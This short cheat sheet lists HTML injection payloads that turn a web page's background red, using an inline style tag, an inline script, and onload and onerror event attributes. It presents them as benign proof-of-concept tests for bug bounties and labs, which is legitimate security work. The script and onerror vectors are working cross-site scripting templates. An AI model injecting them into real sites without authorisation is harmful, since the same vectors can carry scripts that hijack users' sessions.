
# **HTML Injection Payloads to Change Background Color**

You can change the `<body>` background by injecting **CSS**, **JavaScript**, or **event attributes**, depending on what’s allowed in the target context.

---

### **1. Inline `<style>` Injection (HTML/CSS allowed)**

```html
<style>body { background: red !important; }</style>
```

> Injects a CSS rule that sets the body background to red. Replace `red` with any valid color (`green`, `blue`, `#00ff00`, etc.).

---

### **2. Inline JavaScript Payload (JS allowed)**

```html
<script>document.body.style.background='red';</script>
```

> Immediately sets the body background color via JavaScript. Works only if `<script>` tags are allowed.

---

### **3. Event Attribute Injection (injectable attributes allowed)**

* **Using `<body>` tag:**

```html
<body onload="document.body.style.background='red'">
```

* **Using any tag with `onerror` or similar event:**

```html
<img src="x" onerror="document.body.style.background='red'">
```

> Useful when scripts or styles are blocked but attributes are allowed.

---

### **Usage Notes**

* Effectiveness depends on **where the injection occurs** and what **filters or sanitization** the application has.
* Replace `'red'` with any desired color.
* Test **only in legal and controlled environments** (bug bounties, CTF labs, your own apps).
* These examples are **educational and non-malicious**.
